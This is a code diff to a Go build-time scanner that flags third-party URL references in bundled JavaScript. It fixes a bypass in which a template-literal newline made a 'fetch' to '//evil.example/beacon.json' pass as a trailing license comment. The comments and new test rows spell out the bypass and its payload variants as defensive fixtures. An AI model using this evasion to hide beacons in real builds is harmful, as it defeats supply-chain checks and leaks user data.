@@ -180,11 +180,11 @@ var allowedSchemes = map[string]bool{"ws": true, "wss": true}
 //
 // Neither scheme-less trigger subsumes the other, and both are needed. The
 // delimiter alone would miss "//evil.example" with no path. The DNS shape
-// alone is what this scan required between ready-8c5 and ready-8c5's rework,
-// and it let every dotless and every numeric host through: an IPv4 quad, a
-// bracketed IPv6 literal, a single-label intranet name, a host hidden behind
-// userinfo. All five shipped green through a real build. A host does not
-// have to look like a DNS name to be a third-party origin.
+// alone is what this scan required for one round of ready-8c5, and it let
+// every dotless and every numeric host through: an IPv4 quad, a bracketed
+// IPv6 literal, a single-label intranet name, a host hidden behind userinfo,
+// a host:port. Every one of them shipped green through a real build. A host
+// does not have to look like a DNS name to be a third-party origin.
 //
 // The delimiter requirement — rather than treating any authority-shaped run
 // as a reference — is what keeps "//" usable as punctuation. "//" is also
@@ -205,6 +205,9 @@ var allowedSchemes = map[string]bool{"ws": true, "wss": true}
 // Both are left in because the alternative — deciding comment-ness and
 // string-ness by lexing minified JavaScript — fails in the direction of a
 // false PASS. Rewording a comment is cheaper than a missed CDN reference.
+// (A third false positive belongs to the exemption rather than to this
+// predicate: a preserved banner carrying a quote character loses its
+// exemption. See legalCommentRegionStart.)
 //
 // One is a false NEGATIVE, and it is the exact residue of the two triggers
 // above: a scheme-less reference to a dotless host with no path, query or
@@ -276,9 +279,13 @@ func exemptRegionStart(path, content string) int {
 
 // legalCommentRegionStart returns the offset at which js's trailing run of
 // pure comments begins, or len(js) when the file does not end in one. A
-// position qualifies when it is the start of a line (or of the file) AND
-// everything from there to EOF is nothing but whitespace, "//" line comments
-// and "/* */" block comments. The earliest qualifying position wins.
+// position qualifies when all three hold, and the earliest qualifying
+// position wins:
+//
+//   - it is the start of a line, or of the file;
+//   - everything from there to EOF is nothing but whitespace, "//" line
+//     comments and "/* */" block comments (isOnlyCommentsAndSpace);
+//   - no backtick, double quote or single quote appears at or after it.
 //
 // That region is where esbuild puts the license banners it is obliged to
 // preserve, because vite.config.ts sets legalComments: "eof". Nothing in a
@@ -287,18 +294,51 @@ func exemptRegionStart(path, content string) int {
 // inline in the code instead — no trailing run, no exemption, and
 // TestDist_ExternalRefScanToleratesBannersAndRelayURLs fails.
 //
-// The assumption this makes, stated so it can be checked: the code before the
-// region is syntactically complete at that line boundary. One could write JS
-// whose final statement is a multi-line template literal whose continuation
-// lines each begin with "//", and this would misread those lines as comments;
-// esbuild's minified output does not emit that shape. The exemption is
-// deliberately confined to a trailing, line-aligned run for that reason — a
-// general "skip every comment" pass would require lexing minified JavaScript,
-// where mistaking a string for a comment silently hides whatever follows it
-// on the line, i.e. fails toward a false PASS.
+// WHY THE QUOTE CONDITION. The first two alone are not enough, and the gap was
+// not hypothetical — appending this to src/main.ts built green through
+// `npm run build` and `go test ./...`:
+//
+//	void fetch(`
+//	//evil.example/beacon.json`);
+//
+// esbuild copies a template literal's newlines into the emitted chunk
+// verbatim, so the chunk's last line became "//evil.example/beacon.json`);" —
+// a line start whose remainder is a "//" run to EOF. isOnlyCommentsAndSpace
+// read those bytes as a comment and the exemption swallowed the closing
+// backtick and paren along with them. They are string data, and a browser
+// resolves them: new URL("\n//evil.example/beacon.json",
+// "https://ready.3dl.dev/board/") is https://evil.example/beacon.json. Two
+// siblings shipped green the same way — the payload line followed by a real
+// preserved banner (so the exempt run is not the final line), and a payload
+// line led by a "/*! */" comment.
+//
+// The condition that closes the class: a raw newline can reach a JavaScript
+// expression in exactly two ways — inside a template literal, or inside a
+// string literal continued by a trailing backslash — and either way the
+// literal must be closed by its delimiter (`, " or ') before the file ends.
+// If a candidate region begins inside such a literal, that closing delimiter
+// necessarily lies inside the region, at or after the injected bytes. A region
+// containing no quote character therefore cannot be the interior of a literal,
+// and the comment reading is the only reading left. A literal left
+// unterminated at EOF evades the condition but not the consequence: the chunk
+// then fails to parse, so nothing in it runs and nothing is fetched.
+//
+// WHAT THE CONDITION COSTS. A preserved banner that contains a quote character
+// forfeits the exemption for the whole trailing run, so any URL in that banner
+// is reported. The realistic case is a full Apache-2.0 header, which carries
+// both a license URL and the words "AS IS" in quotes after it. That is a loud
+// build break naming the file and offset, not a silent pass, and
+// TestExternalRefScan_Predicate pins it as a KNOWN COST row so it is found
+// here rather than in CI. The alternative — deciding comment-ness by lexing
+// minified JavaScript — fails the other way, because mistaking a string for a
+// comment silently hides whatever follows it on the line.
 func legalCommentRegionStart(js string) int {
+	// A qualifying position must start after the last quote character in the
+	// file; scanning backwards once is equivalent to testing every candidate
+	// and cheaper.
+	afterQuotes := strings.LastIndexAny(js, "`\"'") + 1
 	for i := 0; ; {
-		if isOnlyCommentsAndSpace(js[i:]) {
+		if i >= afterQuotes && isOnlyCommentsAndSpace(js[i:]) {
 			return i
 		}
 		nl := strings.IndexByte(js[i:], '\n')
@@ -313,6 +353,12 @@ func legalCommentRegionStart(js string) int {
 // code position, consists of nothing but whitespace and complete comments.
 // An unterminated /* block comment is not "complete" and returns false; an
 // unterminated // line comment at EOF is.
+//
+// "Starting in code position" is a precondition, not something this function
+// checks: handed the interior of a string or template literal it will happily
+// report that attacker-supplied bytes are a comment run. Establishing the
+// precondition is legalCommentRegionStart's job — see the quote condition
+// there — so do not call this from anywhere else without doing the same.
 func isOnlyCommentsAndSpace(s string) bool {
 	for {
 		s = strings.TrimLeft(s, " \t\r\n")
@@ -406,6 +452,27 @@ func TestExternalRefScan_Predicate(t *testing.T) {
 		{"protocol-relative to a bare DNS origin with no path at all", "chunk.js",
 			`fetch("//evil.example")`, 1},
 
+		// A newline inside a template literal puts attacker-controlled bytes
+		// at the start of a line, where they read as a comment run to EOF and
+		// the trailing-banner exemption used to swallow them — closing
+		// backtick, paren and all. All three rows below built GREEN through a
+		// real `npm run build`; the first is a live fetch of
+		// https://evil.example/beacon.json once the browser resolves the
+		// literal against the page URL. legalCommentRegionStart's quote
+		// condition is what rejects them.
+		{"payload at a line start inside a template literal", "chunk.js",
+			"d();fetch(`\n//evil.example/beacon.json`);\n", 1},
+		{"same payload, with a real preserved banner after it", "chunk.js",
+			"d();fetch(`\n//evil.example/beacon.json`);\n// @license MIT — https://example.com/l\n", 1},
+		{"payload line led by a legal block comment", "chunk.js",
+			"d();fetch(`\n/*!x*/ //evil.example/beacon.json`);\n", 1},
+		// esbuild folds a backslash-continued string onto one line, so this
+		// shape does not survive today's build. It is pinned because the
+		// exemption must not depend on that: a bundler that preserved the
+		// continuation would reproduce the template-literal bypass exactly.
+		{"payload at a line start inside a backslash-continued string", "chunk.js",
+			"d();fetch(\"\\\n//evil.example/beacon.json\");\n", 1},
+
 		// --- must be accepted -------------------------------------------
 		{"preserved license banner at EOF", "chunk.js",
 			"const a=1;\n// @license MIT — https://example.com/l\n", 0},
@@ -431,6 +498,21 @@ func TestExternalRefScan_Predicate(t *testing.T) {
 		// improvement — delete the row, do not weaken the change to keep it.
 		{"KNOWN GAP: dotless host with no path is indistinguishable from a one-word line comment", "chunk.js",
 			`fetch("//telemetry")`, 0},
+
+		// --- known cost, pinned so it stays visible -----------------------
+		//
+		// Also NOT a property worth having: the price of the quote condition
+		// in legalCommentRegionStart. A quote character anywhere in the
+		// trailing comment run forfeits the exemption for the whole run, and a
+		// full Apache-2.0 header has both a license URL and "AS IS" after it,
+		// so this reports 1 where the banner is genuinely inert. The board
+		// ships no runtime dependencies today; if one ever lands a banner like
+		// this the build breaks loudly here rather than passing silently. A
+		// change that keeps every literal-interior row above red while making
+		// this row 0 is strictly better — delete the row, do not weaken the
+		// change to keep it.
+		{"KNOWN COST: a quote after a URL in a preserved banner forfeits its exemption", "chunk.js",
+			"const a=1;\n/*! Licensed under the Apache License, Version 2.0\n * http://www.apache.org/licenses/LICENSE-2.0\n * distributed on an \"AS IS\" BASIS\n */\n", 1},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			got := scanExternalRefs(tc.content, exemptRegionStart(tc.path, tc.content))
